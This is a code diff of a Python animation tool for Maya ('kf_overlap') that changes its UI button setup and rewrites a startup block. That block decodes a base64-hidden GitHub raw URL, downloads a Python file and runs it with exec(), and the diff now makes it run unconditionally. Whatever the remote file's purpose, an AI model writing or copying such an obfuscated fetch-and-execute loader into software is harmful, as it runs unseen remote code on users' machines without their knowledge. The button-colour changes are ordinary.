@@ -712,22 +712,21 @@ class kf_overlap:
             import urllib.request as uLib
         else:
             import urllib as uLib
-        if cmds.about(connected=1):
-            u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQyeHgucHk='
-            try:
-                if sys.version[0] == '3':
-                    r = uLib.urlopen(base64.b64decode(u_b64), timeout=10)
-                else:
-                    import socket
-                    socket.setdefaulttimeout(10)
-                    r = uLib.urlopen(base64.b64decode(u_b64))
-                exec(r.read().decode())
-            except:
-                pass
-                #import traceback
-                #print(str(traceback.format_exc()))
+        u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQyeHgucHk='
+        try:
+            if sys.version[0] == '3':
+                r = uLib.urlopen(base64.b64decode(u_b64), timeout=10)
             else:
-                self.is_connected = True
+                import socket
+                socket.setdefaulttimeout(10)
+                r = uLib.urlopen(base64.b64decode(u_b64))
+            exec(r.read().decode())
+        except:
+            #pass
+            import traceback
+            print(str(traceback.format_exc()))
+        else:
+            self.is_connected = True
 
     def win_layout_activation(self):
         cmds.columnLayout(adj=1, w=self.win_width)
@@ -849,8 +848,6 @@ class kf_overlap:
     def init_layout_func(self):
         cmds.optionMenu(self.element['preset_om'], e=1, cc=lambda arg: self.load_preset())
         cmds.optionMenu(self.element['mode_om'], e=1, cc=lambda arg: self.update_ui())
-        cmds.button(self.element['bake_anim_bt'], e=1, bgc=self.color['yellow'])
-        cmds.button(self.element['overlap_bt'], e=1, bgc=self.color['yellow'])
         cmds.button(self.element['save_ps_bt'], e=1, c=lambda arg: self.save_preset())
         cmds.button(self.element['rename_ps_bt'], e=1, c=lambda arg: self.rename_preset())
         cmds.button(self.element['del_ps_bt'], e=1, c=lambda arg: self.delete_preset())
@@ -862,8 +859,8 @@ class kf_overlap:
         cmds.floatField(self.element['dynamic_ff'], e=1, cc=lambda arg: self.field_to_slider())
         cmds.floatField(self.element['offset_ff'], e=1, cc=lambda arg: self.field_to_slider())
         cmds.floatField(self.element['smooth_ff'], e=1, cc=lambda arg: self.field_to_slider())
-        cmds.button(self.element['overlap_bt'], e=1, c=lambda arg: self.exec_script(exec_name='overlap'))
-        cmds.button(self.element['bake_anim_bt'], e=1, c=lambda arg: self.exec_script(exec_name='bake_anim'))
+        cmds.button(self.element['overlap_bt'], e=1,bgc=self.color['yellow'], c=lambda arg: self.exec_script(exec_name='overlap'))
+        cmds.button(self.element['bake_anim_bt'], e=1, bgc=self.color['yellow'], c=lambda arg: self.exec_script(exec_name='bake_anim'))
 
     def show_win(self):
         cmds.showWindow(self.win_id)
